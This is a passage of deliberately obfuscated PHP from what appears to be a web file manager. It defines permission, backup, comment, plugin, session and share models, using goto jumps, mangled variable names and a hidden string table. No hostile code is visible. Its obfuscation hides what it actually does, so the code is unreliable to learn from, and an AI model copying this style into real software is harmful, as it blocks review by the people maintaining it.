Backup::set($Â܊); if ($eʎٿ > $B) { return !1; } return !0; goto fƈ; F埑: foreach ($c߆ as $aߋ) { $F󡵌 = $d . $aߋ . $aӗ[734]; $c㪓 = null; if ($aߋ == $aӗ[735] && (!isset($b[$aӗ[702]]) || $b[$aӗ[702]] == $aӗ[485])) { $c㪓 = self::$io; } $B += $E->sqlFromDb($aߋ, $F󡵌, $Dέ, $c㪓); } $Dέ->end(); $Â܊ = array($aӗ[736] => $c̅ڱØ, $aӗ[716] => 1, $aӗ[737] => $eʎٿ + 1, $aӗ[738] => $B); goto cշń; fƈ: } private function _dbType($Dɭ) { goto BЏϬ; BЏϬ: $d㈎ս =& $_SERVER[Ť]; $Dɭ = array_change_key_case($Dɭ); $A⣤ΰ = $Dɭ[$d㈎ս[739]]; goto f߻; f߻: if ($A⣤ΰ == $d㈎ս[740]) { $C嚲 = explode($d㈎ս[4], $Dɭ[$d㈎ս[741]]); $A⣤ΰ = $C嚲[0]; } $fЊ = array($d㈎ս[742] => $d㈎ս[9], $d㈎ս[743] => $d㈎ս[744]); if (isset($fЊ[$A⣤ΰ])) { $A⣤ΰ = $fЊ[$A⣤ΰ]; } goto e֍; e֍: return $A⣤ΰ; goto cűΧ; cűΧ: } } goto Aɖ; f: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $a =& $_SERVER[Ť]; $Bˤ = array(array($a[402] => LNG($a[1653]), $a[1654] => $a[1655], $a[1656] => 1, $a[1657] => 1, $a[1658] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($a[402] => LNG($a[1659]), $a[1654] => $a[1660], $a[1656] => 2, $a[1657] => 1, $a[1658] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($a[402] => LNG($a[1661]), $a[1654] => $a[1662], $a[1656] => 3, $a[1657] => 1, $a[1658] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($a[402] => LNG($a[1663]), $a[1654] => $a[1664], $a[1656] => 4, $a[1657] => 1, $a[1658] => self::AUTH_SHOW | self::AUTH_VIEW), array($a[402] => LNG($a[1665]), $a[1654] => $a[1666], $a[1656] => 5, $a[1657] => 1, $a[1658] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($a[402] => LNG($a[1667]), $a[1654] => $a[1668], $a[1656] => 6, $a[1657] => 1, $a[1658] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($a[402] => LNG($a[1669]), $a[1654] => $a[1670], $a[1656] => 7, $a[1657] => 1, $a[1658] => 0)); return $Bˤ; } public static function authCheck($aꂇů, $A) { $aꂇů = intval($aꂇů); if (_get($GLOBALS, $_SERVER[Ť][474])) { return !0; } if ($aꂇů <= 0) { return !1; } if (($aꂇů & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aꂇů & $A); } public static function authCheckShow($d) { return self::authCheck($d, self::AUTH_SHOW); } public static function authCheckView($eڋ) { return self::authCheck($eڋ, self::AUTH_VIEW); } public static function authCheckDownload($A拙) { return self::authCheck($A拙, self::AUTH_DOWNLOAD); } public static function authCheckUpload($a֭) { return self::authCheck($a֭, self::AUTH_UPLOAD); } public static function authCheckEdit($Dԑԝ) { return self::authCheck($Dԑԝ, self::AUTH_EDIT); } public static function authCheckRemove($dɤҝ) { return self::authCheck($dɤҝ, self::AUTH_REMOVE); } public static function authCheckShare($eġ) { return self::authCheck($eġ, self::AUTH_SHARE); } public static function authCheckComment($BƖ) { return self::authCheck($BƖ, self::AUTH_COMMENT); } public static function authCheckEvent($Bǫ) { return self::authCheck($Bǫ, self::AUTH_EVENT); } public static function authCheckRoot($CՖ) { return self::authCheck($CՖ, self::AUTH_ROOT); } public static function authCheckAction($e, $dȃ˞) { goto fԶ; A̛: if (($e & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($e & $fϴ); goto C; d繦: $fϴ = $C剦[$dȃ˞]; $e = intval($e); if ($e <= 0) { return !1; } goto A̛; fԶ: $bŜ =& $_SERVER[Ť]; $C剦 = array($bŜ[1671] => self::AUTH_VIEW, $bŜ[1064] => self::AUTH_DOWNLOAD, $bŜ[103] => self::AUTH_UPLOAD, $bŜ[1619] => self::AUTH_EDIT, $bŜ[1618] => self::AUTH_REMOVE, $bŜ[1629] => self::AUTH_SHARE, $bŜ[348] => self::AUTH_COMMENT, $bŜ[1482] => self::AUTH_EVENT, $bŜ[1672] => self::AUTH_ROOT); if (!isset($C剦[$dȃ˞])) { return; } goto d繦; C: } public static function authDisable($E먷, $E) { if (intval($E먷) <= 0) { return 0; } return intval($E먷) & ~$E; } public $optionType = "\123\171\x73\x74\145\155\56\x73\x6f\165\162\143\145\101\165\x74\150\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\141\x75\x74\150", "\x6c\141\142\145\x6c", "\x64\151\x73\x70\x6c\x61\171", "\163\171\163\x74\x65\x6d", "\163\157\162\164"); public function initData() { $eί = $this->authDefault(); foreach ($eί as $f) { $this->add($f); } } public function listData($dߓ = false, $Fׇ = "\163\157\162\164", $C = false) { return parent::listData($dߓ, $Fׇ, $C); } public function update($Cڧס, $d) { $f =& $_SERVER[Ť]; $C = parent::listData($Cڧס); $A = $this->findByName($d[$f[28]]); if (!$C || $A && $A[$f[383]] != $C[$f[383]]) { return !1; } $this->filterAuth($d[$f[392]]); return parent::update($Cڧס, $d); } public function remove($Eݚ׵) { $b՗ = parent::listData($Eݚ׵); if (!$b՗ || $b՗[$_SERVER[Ť][1136]]) { return !1; } return parent::remove($Eݚ׵); } public function add($Fޫ = array()) { goto c̰; c̰: $c⸼ =& $_SERVER[Ť]; if ($this->findByName($Fޫ[$c⸼[28]])) { return !1; } $F܆ = array($c⸼[28] => $c⸼[33], $c⸼[392] => 1, $c⸼[1673] => $c⸼[1662], $c⸼[1674] => 1, $c⸼[1136] => 0, $c⸼[1675] => 0); goto E; eӿѮ: return parent::insert($Fޫ); goto C; E: $Fޫ = array_merge($F܆, $Fޫ); $Fޫ[$c⸼[1675]] = $this->getSort(); $this->filterAuth($Fޫ[$c⸼[392]]); goto eӿѮ; C: } private function getSort() { $bܨ =& $_SERVER[Ť]; $Aڣ = parent::listData(); $cӯ = array_to_keyvalue($Aڣ, $bܨ[33], $bܨ[1675]); return empty($cӯ) ? 0 : max($cӯ) + 1; } private function filterAuth(&$búƧ) { goto Eߎބ; C: foreach ($cӛΊ as $b춎) { if (isset($E[$b춎])) { $cӛΊ = array_merge($cӛΊ, $E[$b춎]); } } $cӛΊ[] = self::AUTH_SHOW; $búƧ = array_sum(array_unique($cӛΊ)); goto cٔ; A߃: foreach ($f󥋵͒ as $b춎) { if ($búƧ & $b춎) { $cӛΊ[] = $b춎; } } if (in_array(self::AUTH_ROOT, $cӛΊ)) { $búƧ = array_sum($f󥋵͒); return; } $E = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto C; Eߎބ: if (!$búƧ) { return; } $f󥋵͒ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $cӛΊ = array(); goto A߃; cٔ: } public function sort($eΑ, $aվĤ) { return parent::update($eΑ, $aվĤ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x62\141\x63\x6b\x75\160\114\x69\163\x74"; public $field = array("\151\157", "\x6e\141\x6d\145", "\x73\164\141\x74\x75\163", "\x63\x6f\156\164\145\x6e\x74", "\x72\145\x73\165\154\x74", "\x74\x69\155\x65\106\162\x6f\x6d", "\x74\151\155\x65\124\x6f"); public function config() { goto aʙ; BߡӰ: $B߆ = is_array($B߆) ? $B߆ : array(); if (!isset($B߆[$AԷ[702]])) { $B߆[$AԷ[702]] = $AԷ[83]; } $eҎ̼ = array(); goto Cե; aʙ: $AԷ =& $_SERVER[Ť]; $B߆ = Model($AԷ[1093])->get($AԷ[730]); $B߆ = json_decode($B߆, !0); goto BߡӰ; D֢: if (isset($eҎ̼[$AԷ[193]])) { $eҎ̼[$AԷ[193]] = json_decode($eҎ̼[$AԷ[193]], !0); } if (isset($B߆[$AԷ[193]])) { $eҎ̼[$AԷ[193]][$AԷ[1467]] = $B߆[$AԷ[193]]; unset($B߆[$AԷ[193]]); } return array_merge($eҎ̼, $B߆); goto a݈; Cե: Action($AԷ[1676])->taskInit(); $D㨾蟝 = Model($AԷ[1677])->listData(); foreach ($D㨾蟝 as $aڼ) { if ($aڼ[$AԷ[1136]] == $AԷ[83] && $aڼ[$AԷ[1482]] == $AԷ[1678]) { $eҎ̼ = $aڼ; break; } } goto D֢; a݈: } public function listData($cް = false, $fƷ = "\155\x6f\x64\151\146\x79\124\151\155\145", $F = false) { return parent::listData($cް, $fƷ, !0); } public function lastItem() { $B = $this->listData(); return !empty($B[0]) ? $B[0] : null; } public function kill($c) { goto B˕; fٹ: return $this->remove($c); goto fɫΖ; e˗: Task::kill($B[729]); Task::kill($B[746]); Task::kill($B[753]); goto F晇; F晇: $BϪ = $c[$B[28]]; $C۱ = TEMP_FILES . $B[726] . $BϪ . $B[8]; IO::remove($C۱, !1); goto fٹ; B˕: $B =& $_SERVER[Ť]; $c = $this->listData($c); if (!$c || empty($c[$B[28]])) { return !0; } goto e˗; fɫΖ: } public function remove($Bϋ񜮡) { $C = $this->listData($Bϋ񜮡); if (!$C) { return !0; } return $this->backupRemove($C); } private function backupRemove($F) { $E =& $_SERVER[Ť]; parent::remove($F[$E[383]]); $d԰ = "\x7b\151\x6f\x3a{$F[$E[701]]}\x7d\57\144\x61\164\x61\142\x61\x73\145\57\x62\x61\143\x6b\165\160\x5f" . $F[$E[28]]; IO::remove($d԰, !1); return !0; } public function start() { goto bƯﺿ; E۶: if (!$Fە || $Fە[$c֌[1464]] != $c֌[83]) { return !1; } $Aʿ = $this->process(); foreach ($Aʿ as $dܰ) { if ($dܰ) { return Task::restart($dܰ[$c֌[383]]); } } goto dѦ; bƯﺿ: $c֌ =& $_SERVER[Ť]; if ($GLOBALS[$c֌[6]][$c֌[84]][$c֌[1679]] != $c֌[83]) { return !0; } $Fە = $this->config(); goto E۶; dѦ: $bէ = new Backup(); $bէ->keep(); $d̬ = $bէ->db(); goto fü釟; fü釟: if ($d̬) { $d̬ = $bէ->dbFile(); if ($d̬ && $Fە[$c֌[702]] == $c֌[485]) { $d̬ = $bէ->file(); } } Backup::set(array($c֌[699] => 1, $c֌[464] => time())); return !0; goto a狃; a狃: } public function process() { $Cء =& $_SERVER[Ť]; return array($Cء[704] => Task::get($Cء[729]), $Cء[707] => Task::get($Cء[746]), $Cء[171] => Task::get($Cء[753])); } public function restore() { $Bλ =& $_SERVER[Ť]; ActionCall($Bλ[989], !0, 1); ActionCall($Bλ[989], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\155\x65" => "\x63\157\x6d\155\145\x6e\x74\137\x6d\145\164\x61", "\x6d\x65\x74\141\x46\x69\145\x6c\x64" => "\143\x6f\155\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($cӼ͞) { $a҉◕ =& $_SERVER[Ť]; if ($cӼ͞[$a҉◕[1680]]) { $cא = $this->where(array($a҉◕[1681] => $cӼ͞[$a҉◕[1680]]))->find(); if (!$cא || $cא[$a҉◕[387]] != $cӼ͞[$a҉◕[387]] || $cא[$a҉◕[473]] != $cӼ͞[$a҉◕[473]]) { return !1; } $this->where(array($a҉◕[1681] => $cӼ͞[$a҉◕[1680]]))->setAdd($a҉◕[1682], 1); } $cӼ͞[$a҉◕[1683]] = 0; $cӼ͞[$a҉◕[1682]] = 0; $cӼ͞[$a҉◕[699]] = 1; return $this->add($cӼ͞); } public function commentCount($Fȑ, $fσ) { goto F; e٘: return array_to_keyvalue($a؜Ȫ, $C[473], $C[1685]); goto A둝; F: $C =& $_SERVER[Ť]; if (!$Fȑ) { return array(); } if (is_string($Fȑ) || is_int($Fȑ)) { $Fȑ = array($Fȑ); } goto Eȥ; Eȥ: $Fޏ = $C[1684]; $D녳Ӊ = array($C[473] => array($C[7], $Fȑ), $C[387] => $fσ); $a؜Ȫ = $this->field($Fޏ)->where($D녳Ӊ)->group($C[473])->select(); goto e٘; A둝: } public function remove($B) { $fݿݼ =& $_SERVER[Ť]; $Fɬ = array($fݿݼ[1681] => $B); $D = $this->where($Fɬ)->find(); if ($D[$fݿݼ[1680]]) { $this->where(array($fݿݼ[1681] => $D[$fݿݼ[1680]]))->setAdd($fݿݼ[1682], -1); } return $this->where($Fɬ)->delete(); } public function edit($cӠ, $f) { $CƏ߿ =& $_SERVER[Ť]; $C = array($CƏ߿[1681] => $cӠ); return $this->where($C)->save(array($CƏ߿[1686] => $f)); } public function prasise($B) { $eڰ =& $_SERVER[Ť]; $b = Model($eڰ[1687]); $A = array($eڰ[1681] => $B, $eڰ[1485] => USER_ID); $C¿ = $b->where($A)->find(); if (!$C¿) { $b->add($A); $FԸ = $this->where(array($eڰ[1681] => $B))->setAdd($eڰ[1683], 1); } else { $b->where($A)->delete(); $FԸ = $this->where(array($eڰ[1681] => $B))->setAdd($eڰ[1683], -1); } return $FԸ; } public function targetInfo($A삋, $e) { goto F΋; F΋: $f՞ =& $_SERVER[Ť]; $B = array($f՞[538] => $A삋, $f՞[539] => $e); $c = $this->where($B)->count(); goto E; E: $b = "\x52\111\107\110\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\x63\157\x6d\155\145\x6e\164\137\x70\162\x61\x69\x73\145\x20\163\164\141\162\x20\x6f\156\x20\x63\x6f\155\155\145\x6e\164\x2e\x63\157\155\155\x65\x6e\x74\111\104\x20\x3d\x20\x73\164\x61\162\x2e\143\x6f\x6d\155\145\156\164\x49\x44"; $bȜ = $this->alias($f՞[348])->where($B)->join($b, $f՞[1688])->count(); $BЭ = array($f՞[1689] => $c, $f՞[1690] => $bȜ); goto Eݱ; Eݱ: return $BЭ; goto fČ; fČ: } public function listData($Eİ) { $bރğ =& $_SERVER[Ť]; if (isset($Eİ[$bރğ[1691]])) { if ($Eİ[$bރğ[1691]]) { $Eİ[$bރğ[1692]] = array($bރğ[942], intval($Eİ[$bރğ[1691]])); } unset($Eİ[$bރğ[1691]]); } if (isset($Eİ[$bރğ[1693]])) { if ($Eİ[$bރğ[1693]]) { $Eİ[$bރğ[1692]] = array($bރğ[939], intval($Eİ[$bރğ[1693]])); } unset($Eİ[$bރğ[1693]]); } return $this->_listData($Eİ); } private function _listData($fʩ) { $Fƴ =& $_SERVER[Ť]; $E繄 = $this->where($fʩ)->_makeOrder()->selectPage(100); $this->_listAppendParent($E繄[$Fƴ[361]]); $this->_listAppendUser($E繄[$Fƴ[361]]); $this->_listAppendMeta($E繄[$Fƴ[361]]); return $E繄; } private function _makeOrder() { $bڃ =& $_SERVER[Ť]; $C = array($bڃ[1683], $bڃ[1682], $bڃ[190]); $b = Input::get($bڃ[423], $bڃ[7], $bڃ[405], $C); $cÉ = Input::get($bڃ[424], $bڃ[7], $bڃ[1487], array($bڃ[1694], $bڃ[421])); $cҢ = $b . $bڃ[50] . $cÉ; return $this->order($cҢ); } private function _listAppendParent(&$bΘ) { goto Cō; Cō: $E㿆 =& $_SERVER[Ť]; $Cڏ = array_unique(array_to_keyvalue($bΘ, $E㿆[33], $E㿆[1680])); $Cڏ = array_remove_value($Cڏ, $E㿆[485]); goto Bٛ; Bʹǳ: foreach ($bΘ as &$cט) { if (isset($C[$cט[$E㿆[1680]]])) { $cט[$E㿆[1695]] = $C[$cט[$E㿆[1680]]]; } } unset($cט); goto fİ; Bٛ: if (!$Cڏ) { return; } $C = $this->where(array($E㿆[1681] => array($E㿆[7], $Cڏ)))->select(); $C = array_to_keyvalue($C, $E㿆[1692]); goto Bʹǳ; fİ: } private function _listAppendUser(&$Dև؄) { goto c舖; Dϒ: foreach ($Dև؄ as &$F) { $F[$c[551]] = $e[$F[$c[1493]]]; if (isset($F[$c[1695]])) { $F[$c[1695]][$c[551]] = $e[$F[$c[1695]][$c[1493]]]; } } unset($F); goto Fƽҽ; FѤ: if (count($b) == 0) { return; } foreach ($Dև؄ as $F) { if (isset($F[$c[1695]])) { $b[] = $F[$c[1695]][$c[1493]]; } } $e = Model($c[494])->userListInfo($b); goto Dϒ; c舖: $c =& $_SERVER[Ť]; $b = array_unique(array_to_keyvalue($Dև؄, $c[33], $c[1493])); $b = array_remove_value($b, $c[485]); goto FѤ; Fƽҽ: } private function _listAppendMeta(&$a) { goto c; fᾍ: if (!$A뾿) { return; } foreach ($a as $a҆ҷ۶) { if (isset($a҆ҷ۶[$E[1695]])) { $A뾿[] = $a҆ҷ۶[$E[1695]][$E[1692]]; } } $Eۼ˜ = $this->metaList($A뾿); goto f຦; f຦: if (!$Eۼ˜) { return !1; } foreach ($a as &$a҆ҷ۶) { $a҆ҷ۶[$E[433]] = $Eۼ˜[$a҆ҷ۶[$E[1692]]]; if (isset($a҆ҷ۶[$E[1695]])) { $a҆ҷ۶[$E[1695]][$E[433]] = $Eۼ˜[$a҆ҷ۶[$E[1695]][$E[1692]]]; } } unset($a҆ҷ۶); goto aƹʧ; c: $E =& $_SERVER[Ť]; $A뾿 = array_unique(array_to_keyvalue($a, $E[33], $E[1692])); $A뾿 = array_remove_value($A뾿, $E[485]); goto fᾍ; aƹʧ: } private function metaList($fʯ) { goto f䬃ń; f䬃ń: $d =& $_SERVER[Ť]; if (!$fʯ) { return array(); } $A = array($d[1692] => array($d[7], $fʯ)); goto Cʶߗه; Cʶߗه: $E = Model($d[1696])->where($A)->select(); $E = array_to_keyvalue_group($E, $d[1692]); foreach ($E as $BǶ => $A) { $bȶŮ = array(); foreach ($A as $b) { $bȶŮ[$b[$d[89]]] = $b[$d[366]]; } $E[$BǶ] = $bȶŮ; } goto dّ; dّ: return $E ? $E : array(); goto d󲷣; d󲷣: } } goto D훕ܴ; A: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\160\x6c\x75\x67\151\x6e\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\x73\164\141\x74\x75\163", "\162\x65\147\151\x65\163\164", "\143\x6f\x6e\x66\x69\147"); public function loadList($a = false) { $fգ = array_to_keyvalue($this->listData(), $_SERVER[Ť][28]); if ($a) { return $fգ[$a]; } return $fգ; } public function init() { $d =& $_SERVER[Ť]; Hook::trigger($d[1761]); $D僻 = $this->loadPluginList(); foreach ($D僻 as $cي => $eѠ) { $c = $this->appAllow($cي, $eѠ); if (!$c) { continue; } foreach ($eѠ[$d[1762]] as $D => $AŅ𼊖) { Hook::bind($D, $AŅ𼊖); } } Hook::trigger($d[1763]); Hook::trigger(ACTION); } public function appAllow($c, $D麽, $C㬆ˊ = true) { $F༴ =& $_SERVER[Ť]; $d˄ = PLUGIN_DIR . $c . $F༴[1764]; if (!is_array($D麽) || !is_array($D麽[$F༴[1762]]) || $D麽[$F༴[699]] != 1 || !is_file($d˄)) { return !1; } if ($GLOBALS[$F༴[474]] == 1) { return !0; } if ($C㬆ˊ && !Action($F༴[1765])->checkAuth($c)) { return !1; } return !0; } public function unInstall($F) { $Bތ =& $_SERVER[Ť]; $FЮ = $this->loadList($F); if (file_exists(PLUGIN_DIR . $F)) { Hook::apply($F . $Bތ[1766]); } $this->remove($FЮ[$Bތ[383]]); } public function changeStatus($Aޏ, $b֢) { $E =& $_SERVER[Ť]; $A = $this->loadList($Aޏ); if ($b֢) { Hook::apply($Aޏ . $E[1767]); } $this->update($A[$E[383]], array($E[1768] => $b֢)); } public function appRegist($aӖ, $eɽ) { $fӣ =& $_SERVER[Ť]; $ẽ = $this->loadList($aӖ); if ($ẽ) { $this->update($ẽ[$fӣ[383]], array($fӣ[1762] => $eɽ)); } else { $Eض̣ = array($fӣ[28] => $aӖ, $fӣ[1762] => $eɽ, $fӣ[699] => 0, $fӣ[6] => $this->getConfigDefault($aӖ)); $this->insert($Eض̣); } } public function getConfigDefault($eݴΰ) { $a񡋝 =& $_SERVER[Ť]; $Fߴ = array(); $Dث⦯ = $this->getPackageJson($eݴΰ); if (!$Dث⦯ && is_array($Dث⦯[$a񡋝[1769]])) { return $Fߴ; } foreach ($Dث⦯[$a񡋝[1769]] as $bꨯ => $Bڂ) { if (!isset($Bڂ[$a񡋝[366]]) || isset($Fߴ[$bꨯ])) { continue; } $Fߴ[$bꨯ] = $Bڂ[$a񡋝[366]]; } return $Fߴ; } public function getPackageJson($e좝) { return Hook::apply($e좝 . $_SERVER[Ť][1770]); } public function getConfig($E虜, $Bӫ = false) { $aеŢ =& $_SERVER[Ť]; $B̺ = array(); $e̱ = $this->loadList($E虜); if ($e̱ && is_array($e̱[$aеŢ[6]])) { $B̺ = $e̱[$aеŢ[6]]; } if (!$B̺ || $Bӫ) { $B̺ = $this->getConfigDefault($E虜); } return $B̺; } public function setConfig($D, $EҎ = false) { goto D݆; dĎ: $this->update($D僦̊[$A߶ŏ[383]], array($A߶ŏ[6] => $AΖ)); goto B㹇; D݆: $A߶ŏ =& $_SERVER[Ť]; $D僦̊ = $this->loadList($D); if (!$D僦̊) { return !1; } goto fۗ; fۗ: $AΖ = $D僦̊[$A߶ŏ[6]]; if ($EҎ == !1) { $AΖ = array(); $EҎ = $this->getConfigDefault($D); } foreach ($EҎ as $f => $c) { $AΖ[$f] = is_string($c) ? trim($c) : $c; } goto dĎ; B㹇: } public function viewList() { goto dφ; dφ: $Fε =& $_SERVER[Ť]; $F = $this->loadList(); $this->pluginScan($F); goto B׆߫; eÍ֤: return $dǉ; goto B㦿; B׆߫: $F = $this->loadPluginList(); $dǉ = array(); foreach ($F as $e => $d٪Ĵ) { unset($d٪Ĵ[$Fε[1762]], $d٪Ĵ[$Fε[6]]); $C藉 = PLUGIN_DIR . $d٪Ĵ[$Fε[28]] . $Fε[1764]; if (!is_file($C藉)) { continue; } $Cڑ = Hook::apply($d٪Ĵ[$Fε[28]] . $Fε[1770]); if (is_array($Cڑ)) { $dǉ[$e] = array_merge($d٪Ĵ, $Cڑ); } } goto eÍ֤; B㦿: } private function loadPluginList() { $f =& $_SERVER[Ť]; $cҦ = $this->loadList(); if (strtolower(MOD) == $f[1771]) { return $cҦ; } $fؗ = Hook::trigger($f[1772], $cҦ); if ($cҦ && !$fؗ) { die; } return $fؗ ? $fؗ : $cҦ; } private function pluginScan($d) { $d¼ =& $_SERVER[Ť]; recursion_dir(PLUGIN_DIR, $B, $C͓, 0); foreach ($B as $Dѿۑ) { $B̑啈 = get_path_this($Dѿۑ); if (isset($d[$B̑啈]) || !file_exists($Dѿۑ . $d¼[1773]) || !file_exists($Dѿۑ . $d¼[1764])) { continue; } Hook::apply($B̑啈 . $d¼[1767]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\x5f\163\x65\x73\163\151\x6f\x6e"; public function get($fےԏ) { $A匒 =& $_SERVER[Ť]; $f = $this->where(array($A匒[1774] => $fےԏ))->find(); if (!is_array($f)) { return !1; } return $f[$A匒[702]]; } public function set($bףИ, $bҰ, $Fݱ = 3600) { $f =& $_SERVER[Ť]; $dσ = array($f[1774] => $bףИ, $f[1686] => $bҰ, $f[1775] => $Fݱ + time()); if (Session::get($f[1776])) { $dσ[$f[1493]] = Session::get($f[1776]); } else { $dσ[$f[1493]] = 0; } if ($this->get($bףИ)) { return $this->where(array($f[1774] => $bףИ))->save($dσ); } else { return $this->add($dσ, array(), !0); } } public function remove($fōު) { return $this->where(array($_SERVER[Ť][1774] => $fōު))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ť][1777] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\124\151\155\x65", "\x74\151\155\145", "\x69\x6e\x73\145\x72\x74\54\165\x70\144\x61\164\145", "\x66\x75\156\x63\164\151\x6f\156"), array("\x63\162\x65\x61\164\x65\124\151\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\145\162\164", "\146\165\x6e\143\164\151\x6f\156"), array("\x6f\160\x74\x69\x6f\x6e\x73", '', "\151\x6e\x73\145\x72\x74\x2c\x75\160\x64\141\x74\145\x2c\163\x65\x6c\x65\x63\164", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Aۅө) { $b =& $_SERVER[Ť]; $aƇ = isset($Aۅө[0]) ? $Aۅө[0] : !1; return array($b[1778] => array(USER_ID, $b[1779]), $b[1727] => array($aƇ, $b[1780])); } protected function listSimple() { $B՘ = array($_SERVER[Ť][1493] => USER_ID); $AЦ = $this->field($this->fieldList)->where($B՘)->select(); return $AЦ ? $AЦ : array(); } protected function getInfo($C劓, $F = false) { $d =& $_SERVER[Ť]; if ($F) { return $this->_getShareInfo(array($d[456] => $C劓)); } $b = $this->cacheFunctionGet($d[1781], $C劓); return $b; } public function getInfoByHash($f睹) { return $this->_getShareInfo(array($_SERVER[Ť][458] => $f睹)); } public function getInfoByPath($b) { $cأ =& $_SERVER[Ť]; $e奍 = array($cأ[1493] => USER_ID, $cأ[385] => $b); return $this->_getShareInfo($e奍); } public function getInfoBySourcePath($F؛) { $A奓 =& $_SERVER[Ť]; $E = array($A奓[1493] => USER_ID, $A奓[1041] => $F؛); return $this->_getShareInfo($E); } private function _getShareInfo($aۭ) { goto bԹ߈; bԹ߈: $fܹٟ =& $_SERVER[Ť]; $fɘĈ = $this->where($aۭ)->find(); if (!$fɘĈ) { return !1; } goto f﷊; dՏ: if ($fɘĈ[$fܹٟ[385]] == $fܹٟ[485]) { $fɘĈ[$fܹٟ[407]] = IO::info($fɘĈ[$fܹٟ[1041]]); } else { $fɘĈ[$fܹٟ[407]] = Model($fܹٟ[1172])->pathInfo($fɘĈ[$fܹٟ[385]]); } $fɘĈ[$fܹٟ[1783]] = $C䡓; return $fɘĈ; goto aٟ; f﷊: $aۭ = array($fܹٟ[456] => $fɘĈ[$fܹٟ[456]]); $e = $fܹٟ[1782]; $C䡓 = Model($fܹٟ[553])->order($fܹٟ[383])->field($e)->where($aۭ)->select(); goto dՏ; aٟ: } protected function getInfoAuth($d) { $fɪؘ =& $_SERVER[Ť]; $E񺽢 = $this->getInfo($d); $E񺽢[$fɪؘ[392]] = Model($fɪؘ[471])->authMake($E񺽢[$fɪؘ[1783]]); return $E񺽢; } protected function listData($fܩ = null, $Dչ副 = 300) { $DچГ =& $_SERVER[Ť]; $aᏍ = array(array($DچГ[461] => array($DچГ[940], 0), $DچГ[463] => array($DچГ[940], 0), $DچГ[1784] => $DچГ[1741])); if ($fܩ == $DچГ[1785]) { $aᏍ = array($DچГ[461] => 1); } else { if ($fܩ == $DچГ[1026]) { $aᏍ = array($DچГ[463] => 1); } } $aᏍ[$DچГ[1493]] = USER_ID; $eҥ = $this->where($aᏍ)->selectPage($Dչ副); return $eҥ; } protected function listToMe($B = 300) { goto B; f: $a͛ = array($cч܏[1788] => $d̦⋜, $cч܏[1789] => $C[$cч܏[358]]); return $a͛; goto fٞ҄; CȊɲ: $d̦⋜ = $this->field($EƜ󦻪)->where($f)->select(); foreach ($d̦⋜ as $B͋ => &$A) { $A[$cч܏[1783]] = $e螖Ʉ[$A[$cч܏[456]]]; } unset($A); goto f; B: $cч܏ =& $_SERVER[Ť]; $F = Model($cч܏[1786])->userGroupParents(USER_ID); $f = array($cч܏[538] => SourceModel::TYPE_USER, $cч܏[473] => USER_ID); goto EČ; EČ: if ($F) { $f = array(array($cч܏[538] => SourceModel::TYPE_USER, $cч܏[473] => USER_ID), array($cч܏[538] => SourceModel::TYPE_GROUP, $cч܏[473] => array($cч܏[7], $F)), $cч܏[1784] => $cч܏[1741]); } $C = Model($cч܏[553])->where($f)->selectPage($B); $e螖Ʉ = array_to_keyvalue_group($C[$cч܏[361]], $cч܏[456]); goto Bǟ; Bǟ: if (!$e螖Ʉ) { return $C; } $EƜ󦻪 = $cч܏[1787]; $f = array($cч܏[456] => array($cч܏[400], array_keys($e螖Ʉ))); goto 